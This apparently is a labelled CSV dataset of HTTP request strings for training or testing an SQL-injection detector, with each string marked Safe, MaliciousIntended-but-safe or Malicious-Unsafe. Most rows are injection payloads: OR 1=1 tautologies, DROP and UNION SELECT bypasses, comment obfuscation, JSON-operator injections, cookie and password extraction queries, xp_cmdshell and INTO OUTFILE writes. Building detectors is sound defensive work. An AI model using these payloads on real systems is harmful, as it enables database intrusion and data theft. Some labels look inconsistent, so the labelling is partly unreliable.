"string,classification"
"pay=length||(,Safe"
"pay=length?(,Safe"
"pay=length&&!!!$(,Safe"
"pay=length&&(,Safe"
"pay=LENGTH(,Safe"
"pay=ln+(,Safe"
"pay=ln)+(,Safe"
"pay=load_file(,Safe"
"pay=local(,Safe"
"pay=log(,Safe"
"pay=log&&(,Safe"
"pay=lower(,Safe"
"pay=MAKE_SET(,Safe"
"pay=MAX(,Safe"
"pay=md5(,Safe"
"pay=md5\(,Safe"
"pay=MID(,Safe"
"pay=minute+(,Safe"
"pay=month=(,Safe"
"name_const(,Safe"
"now(,Safe"
"ord(,Safe"
"password?(,Safe"
"password/?(,Safe"
"Password>$(,Safe"
"pg_sleep(,Safe"
"pi(,Safe"
"pow(,Safe"
"quarter.(,Safe"
"rand(,MaliciousIntended-but-safe"
"replace(,MaliciousIntended-but-safe"
"round(,MaliciousIntended-but-safe"
"rtrim(,MaliciousIntended-but-safe"
"pay=sin(,MaliciousIntended-but-safe"
"SIN(,MaliciousIntended-but-safe"
"pay=sleep(,Malicious-Unsafe"
"SLEEP(,MaliciousIntended-but-safe"
"pay=strcmp(,MaliciousIntended-but-safe"
"pay=substr(,MaliciousIntended-but-safe"
"SUBSTR(,MaliciousIntended-but-safe"
"pay=substring(,MaliciousIntended-but-safe"
"SUBSTRING(,MaliciousIntended-but-safe"
"pay=sysdate(,MaliciousIntended-but-safe"
"time(,MaliciousIntended-but-safe"
"pay=time(,MaliciousIntended-but-safe"
"pay=trim(,MaliciousIntended-but-safe"
"pay=Uncompress+(,MaliciousIntended-but-safe"
"pay=unhex(,MaliciousIntended-but-safe"
"pay=updatexml(,MaliciousIntended-but-safe"
"pay=UPPER(,MaliciousIntended-but-safe"
"pay=user+(,MaliciousIntended-but-safe"
"pay=user/?(,MaliciousIntended-but-safe"
"pay=user(,MaliciousIntended-but-safe"
"pay=values+(,MaliciousIntended-but-safe"
"pay=VALUES(,MaliciousIntended-but-safe"
"pay=version=(,MaliciousIntended-but-safe"
"pay=version(,MaliciousIntended-but-safe"
"pay=xmltype(,MaliciousIntended-but-safe"
"pay=year]=(,MaliciousIntended-but-safe"
"var=(((((())))))&var2=whatever,Safe"
"var=-------------------&var2=whatever,Safe"
"var=;;ddfoobar,MaliciousIntended-but-safe"
"/post?var=DROP sampletable;--,Malicious-Unsafe"
"test='or1=1;?,MaliciousIntended-but-safe"
"test=OR1#,MaliciousIntended-but-safe"
"test=admin'--,Malicious-Unsafe"
"test=DROP/comment/sampletable,Malicious-Unsafe"
"test=DR//OP/bypassdenylisting/sampletable,MaliciousIntended-but-safe"
"test=SELECT/avoid-spaces/password//FROM//Members,Malicious-Unsafe"
"test=SELECT/!323021/0,/1FROMtablename,MaliciousIntended-but-safe"
"test='or1=1#,Malicious-Unsafe"
"test='or1=1---,Malicious-Unsafe"
"test='or1=1/,Malicious-Unsafe"
"test=1='1'or---,Malicious-Unsafe"
"test='/!50000or*/1='1,Malicious-Unsafe"
"test='/!or/1='1,Malicious-Unsafe"
"test=0//union/!50000select/table_namefoo/**/,MaliciousIntended-but-safe"
"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe"
"foo=bar,Safe"
"/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe"
"/get/?fbclid=IwAR1dug0BYxe0ukhZ2vKrdQwLAxVFRJ--Q2Y7OBJE_0uId9-Eh-sJWLdVk2E,Safe"
"/get/?gclid=j0KCQiA1NebBhDDARIsAANiDD3_RJeMv8zScF--mC1jf8fO8PDYJCxD9xdwT7iQ59QIIwL-86ncQtMaAh0lEALw_wcB,Safe"
"var=\0xf00dsdfdsa,Safe"
"var=concat(0x223e3c62723e,version(),0x3c696d67207372633d22),Malicious-Unsafe"
"var=select 0x616263,Malicious-Unsafe"
"var=IHRlc3Q0xAcF,Safe"
"var=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08,Safe"
"var=foo....,Safe"
"var=foo...,Safe"
"pay=nvarchar,Safe"
"pay=xp_cmdshell,MaliciousIntended-but-safe"
"pay=varchar,Safe"
"pay=xp_dirtree,MaliciousIntended-but-safe"
"pay=xp_regread,MaliciousIntended-but-safe"
"pay=sp_password,MaliciousIntended-but-safe"
"pay=UTL_HTTP,MaliciousIntended-but-safe"
"pay=OPENROWSET,MaliciousIntended-but-safe"
"pay=sp_executesql,MaliciousIntended-but-safe"
"sp_executesql,MaliciousIntended-but-safe"
"/index.php?id=1+current_user::int,Malicious-Unsafe"
"/?'msdasql',MaliciousIntended-but-safe"
"var=EmptyValueintooutfile'\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\xct';--,MaliciousIntended-but-safe"
"var=/config.ini'intooutfile'\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\yxq';--,MaliciousIntended-but-safe"
"var=0.3480567293179807'UNIONALLselectNULL--,MaliciousIntended-but-safe"
"var=config.ini"")UNIONALLselectNULL--,MaliciousIntended-but-safe"
"var=CRS)UNIONALLselectNULL--,MaliciousIntended-but-safe"
"var=CRS3"")UNIONALLselectNULL--,MaliciousIntended-but-safe"
"/index.php?id=overlay(password placing '' from 1 for 0)::int,Malicious-Unsafe"
"/index.php?id=overlay(password,MaliciousIntended-but-safe"
"placing,Safe"
"',Safe"
"from 1 for 0)::int"",Safe"
"var=""` * 123,Safe"
"""'',10"",MaliciousIntended-but-safe"
"','','','','','','','',13,MaliciousIntended-but-safe"
"`>65,Safe"
"pay='1001'='10,MaliciousIntended-but-safe"
"""2562*23,Safe"
"pay="":[""00,Safe"
"pay=`>6fbdec2,Safe"
"pay='][0]]),strtolower($b[$GLOBALS[',Safe"
"pay=',2,1,MaliciousIntended-but-safe"
"`>9e7,Safe"
"pay="":""65,Safe"
"pay='\2nq5,Safe"
"pay=`<0)AND`,MaliciousIntended-but-safe"
"pay='0:0:6,Safe"
""":60,Safe"
"pay="">%5-type_submit_reset_5,Safe"
""":35,Safe"
"pay='3085'='30,MaliciousIntended-but-safe"
""":[0,\x22,Safe"
"pay='16/17,Safe"
";}7b6,Safe"
"/?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0},Malicious-Unsafe"
"/?id=9999+or+{if+length((/*+!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe"
"/get?test=9999+or+/*+optimizer+hint+*/+true,Malicious-Unsafe"
"/get?test=9999+or+/*++optimizer+hint+*/+true,Malicious-Unsafe"
"/?test=9999+or+{if+length((/*!5000select+username/*!comment*/,MaliciousIntended-but-safe"
"/`bla`,Safe"
"/?'bla',Safe"
"var=id'is not-id--,MaliciousIntended-but-safe"
"var=id'is notes,Safe"
"var=id'not like id--,MaliciousIntended-but-safe"
"var=id'not glob-id--,MaliciousIntended-but-safe"
"var=x'|email--,Malicious-Unsafe"
"var=x'-email--,Malicious-Unsafe"
"var=x'%2Bemail--,Malicious-Unsafe"
"var=x'^email--,Malicious-Unsafe"
"var=x'@email--,Malicious-Unsafe"
"var=x'&email--,Malicious-Unsafe"
"var=x'<email--,Malicious-Unsafe"
"var=x'>email--,Malicious-Unsafe"
"var=x'=email--,Malicious-Unsafe"
"var=x'/email--,Malicious-Unsafe"
"var=x'%email--,Malicious-Unsafe"
"var=x'~email--,Malicious-Unsafe"
"var=x' mod id--,Malicious-Unsafe"
"var='sounds like rowid--,Malicious-Unsafe"
"var='/**/*2--,Malicious-Unsafe"
"var=foo'or'oof,Malicious-Unsafe"
"var=foo\''or'oof,Malicious-Unsafe"
"email=' is not?--,MaliciousIntended-but-safe"
"var=a'or'a,Malicious-Unsafe"
"var=a'or?--,MaliciousIntended-but-safe"
"var=is this your parents' or yours?,Safe"
"var=user'and id is not?--,MaliciousIntended-but-safe"
"var=it is your parents' and yours,Safe"
"var=bob's or alice's,Safe"
"var=mother or daughter,Safe"
"var='oreo,Safe"
"var='fork,Safe"
"var=' for,Safe"
"var=''or,Malicious-Unsafe"
"var='''or 1,Malicious-Unsafe"
"var=\'lol' or '1,Malicious-Unsafe"
"' OR '1'='1,Malicious-Unsafe"
"' OR '1'='1' --,Malicious-Unsafe"
"' OR '1'='1' {,Malicious-Unsafe"
"' OR '1'='1' /*,Malicious-Unsafe"
"var=!!!!!'...""""!!'.""""`.`...'.....'@`!!!!`....""""@@@@@`!!!!!'`@@@@@'...""""'@@@@@'""""...'!!!`!`@@""""'@@`..'!!'@@@@""""@@@@`!!!!'!""""@@@@@'!!!`!!!!""""!!!""""!!!!!'....''@'""""`,Safe"
"admin%40juice-sh.op\'and%20likely%20(id)--,MaliciousIntended-but-safe"
"var=\'or'1,Malicious-Unsafe"
"var=\""or""1,Malicious-Unsafe"
"var=`or`1,Malicious-Unsafe"
"var=\'and,MaliciousIntended-but-safe"
"var='or'1,Malicious-Unsafe"
"var=\'fooor,Safe"
"var=newline,Safe"
"\'and1,MaliciousIntended-but-safe"
"var=Incorrectly constructed SQL statements,Safe"
"or using comments to even block the rest of the query (there are three types of SQL comments[14]). All three lines have a space at the end:,Safe"
"email=admin@juice-sh.op';&password=foo,Malicious-Unsafe"
"email=admin@juice-sh.op';,Malicious-Unsafe"
"email=admin@juice-sh.op"";,Malicious-Unsafe"
"email=admin@juice-sh.op`;,Malicious-Unsafe"
"email='foo';'bar';'def',Malicious-Unsafe"
"email`foobardef`,Safe"
"email=root@example.com'/* comment */;,Malicious-Unsafe"
"id=OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"/OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"id=OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}',Malicious-Unsafe"
"/OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}',Malicious-Unsafe"
"id=OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"/OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"id=OR '{""b"":2}'::json <@ '{""a"":1, ""b"":2}',Malicious-Unsafe"
"/OR '{""b"":2}'::json <@ '{""a"":1, ""b"":2}',Malicious-Unsafe"
"id=OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::json,Malicious-Unsafe"
"/OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::json,Malicious-Unsafe"
"id=OR '{""b"":2}'::jsonb @> '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"/OR '{""b"":2}'::jsonb @> '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"id=OR '{""b"":2}'::jsonb < '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"/OR '{""b"":2}'::jsonb < '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"id=OR '{""b"":2}'::jsonb > '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"/OR '{""b"":2}'::jsonb > '{""a"":1, ""b"":2}'::jsonb,Malicious-Unsafe"
"id=OR '{""a"":2,""c"":[4,5,{""f"":7}]}' -> '$.c[2].f' = 7,Malicious-Unsafe"
"/OR '{""a"":2,""c"":[4,5,{""f"":7}]}' -> '$.c[2].f' = 7,Malicious-Unsafe"
"id=OR '{""a"":2,""c"":[4,5,{""f"":7}]}' <- '$.c[2].f' = 7,MaliciousIntended-but-safe"
"/OR '{""a"":2,""c"":[4,5,{""f"":7}]}' <- '$.c[2].f' = 7,MaliciousIntended-but-safe"
"id=OR json_extract('{""id"": 14, ""name"": ""Aztalan""}', '$.name') = 'Aztalan',Malicious-Unsafe"
"/OR json_extract('{""id"": 14, ""name"": ""Aztalan""}', '$.name') = 'Aztalan',Malicious-Unsafe"
"id=blah/""""}' and data @> '{""a"":""a""}' union select ASCII(s.token) from unnset(string_to_array((select cookie from cookie limit 1 ),NULL)) s(token)--/state"",MaliciousIntended-but-safe"
"/blah/""""}' and data @> '{""a"":""a""}' union select ASCII(s.token) from unnset(string_to_array((select cookie from cookie limit 1 ),NULL)) s(token)--/state"",MaliciousIntended-but-safe"
"id=OR '{""a"":""b""}' ? 'a',Malicious-Unsafe"
"/OR '{""a"":""b""}' ? 'a',Malicious-Unsafe"
"id=OR '[1,2]' ? '1',Malicious-Unsafe"
"/OR '[1,2]' ? '1',Malicious-Unsafe"
"id=OR '{""name"":""asd""}' ?| array['a','name'],Malicious-Unsafe"
"/OR '{""name"":""asd""}' ?| array['a','name'],Malicious-Unsafe"
"id=OR '{""name"":""asd""}' ?& array['a','name'],Malicious-Unsafe"
"/OR '{""name"":""asd""}' ?& array['a','name'],Malicious-Unsafe"
"id=OR '[1,2,3]'::json ->> 2='3',Malicious-Unsafe"
"/OR '[1,2,3]'::json ->> 2='3',Malicious-Unsafe"
"id=OR '{""a"":1}'::jsonb #> '{a,b}' ? 'c',Malicious-Unsafe"
"/OR '{""a"":1}'::jsonb #> '{a,b}' ? 'c',Malicious-Unsafe"
"email=1.e(ascii+1.e(substring(1.e(select+password+from+users+limit+1+1.e,1+1.e)+1.e,1+1.e,1+1.e)1.e)1.e)+=+70+or'1'='2,MaliciousIntended-but-safe"
"foo=1.e(ascii),MaliciousIntended-but-safe"
